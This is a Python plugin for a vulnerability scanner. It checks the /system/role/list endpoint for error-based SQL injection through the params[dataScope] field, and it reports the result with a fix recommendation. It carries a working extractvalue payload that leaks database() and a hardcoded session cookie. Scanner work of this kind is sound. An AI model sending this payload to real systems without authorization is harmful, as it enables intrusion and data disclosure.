# SQL 报错注入（role）：/system/role/list 的 params[dataScope] 参数 extractvalue 报错注入
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import host_of


class SqlInjectRolePlugin(PluginBase):
    name = 'POST型报错注入（role）'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = '/system/role/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()'
    fix = '对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询'

    def verify(self, target, session):
        host = host_of(target)
        # 原 headers 1:1 保留（含 Origin/Referer/Cookie 等）
        headers = {
            "Host": host,
            "nt": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "181",
            "Origin": "http://{}".format(host),
            "Connection": "close",
            "Referer": "http://{}/system/role".format(host),
            "Cookie": "UMK8_2132_ulastactivity=fdf6lh5P4KaIR7rPwncVmGmx5z2ymLLNz3o33msgkFJlQ1SdH/hR; UMK8_2132_lastcheckfeed=1|1637287051; UMK8_2132_nofavfid=1; JSESSIONID=d9eca4a4-7fcd-41ba-9888-75e7c73dc9bf",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        # 原 data 1:1 保留（含 extractvalue payload）
        data = {
            'pageSize': '',
            'pageNum': '',
            'orderByColumn': '',
            'isAsc': '',
            'roleName': '',
            'roleKey': '',
            'status': '',
            'params[beginTime]': '',
            'params[endTime]': '',
            'params[dataScope]': 'and extractvalue(1,concat(0x7e,(select database()),0x7e))'
        }
        url = target + '/system/role/list'
        try:
            sql_inject = session.post(url, headers=headers, data=data).text
        except Exception as e:
            print(no('POST型报错注入（role，网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))
        # 判定 1:1 保留：'运行时异常' in t or 'database()' in t
        if '运行时异常' in sql_inject or 'database()' in sql_inject:
            print(ok('存在POST型报错注入'))
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url,
                              evidence='响应含 运行时异常 或 database() 报错特征', fix=self.fix)
        else:
            print(no('不存在POST型报错注入'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url)
